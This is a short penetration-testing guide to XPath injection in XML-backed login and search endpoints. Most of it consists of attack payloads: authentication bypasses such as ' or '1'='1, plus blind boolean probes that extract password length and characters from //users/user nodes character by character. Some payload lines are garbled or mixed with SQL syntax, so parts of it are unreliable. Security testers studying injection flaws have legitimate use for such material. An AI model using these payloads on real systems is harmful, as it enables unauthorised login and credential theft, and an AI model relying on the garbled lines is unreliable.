# HOW TO TEST XPATH INJECTION ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN

## The N ways to test
1. Login/key field with XPath: pass ' or '1'='1 and '"'"' or '"'"'1'"'"'='1.
2. Blind in path filters: user/document search built as //users[user='<input>'] and '/password'.
3. Error-fingerprint : ' triggers "XML parser" errors → likely XPath.
4. Boolean: '/()[1]... with ' and count(//user[id=1]/position()) vs wrong.
5. Read remote? no - XPath reads XML documents the server has, not filesystem, but can still
   send data to you in band if there's an echo attribute.
6. Injection into order-by / attribute filters; numeric fields probe with 1-0=1.
7. Substring/position extraction for blind chars (like SQLi).

## Step-by-step on target
1. Bind params: username, keyword, ID in an XML-driven search endpoint.
2. Probe: user=admin' and '1'='1  vs  admin' and '1'='2  (observe different result/rows).
3. Count rows to reveal truth: count(//book)=7 works.
4. Extract data OR write your query as an error feedback of substring().

## Worked examples (concrete)
auth bypass (login):
```
user=' or '1'='1
user='" or '"'='"  (quotes for attribute context)
user=' or 1=1-- 
blind boolean on id:
id=1 and 1=1
id=1 and 1=2
/books/book[id=1 and 1=1] is TRUE vs FALSE
attribute extraction: show if password length equals 5:
id=1 and string-length(//users/user[1]/password)=5
substring char check:
id=1 and substring(//users/user[1]/password,1,1)='a'
row count primitive:
id=1 and count(//users/user)=3
numeric context probe:
```
num=1-0 → works differently when the app parses number as string? (pure arithmetic)
error-based leak-ish (if echo in error):
```
id=1 and substring(//users/user[1]/name,1,5)='admin' → changes error text? observe.
```

## False positives
- A "search" endpoint that returns the same for admin' and '1'='1 as for a typo = SQL not XML, or no injection.
- XPath injection needs an XML node tree, not a DB - apps without XML sources won't be it.

## Advise
- Rare in 2026 (few legacy XML search interfaces). When present, report booleans over rows AND auth bypass.
- Combine with the payload list in XPath_Injection folder for the exact bracket patterns.
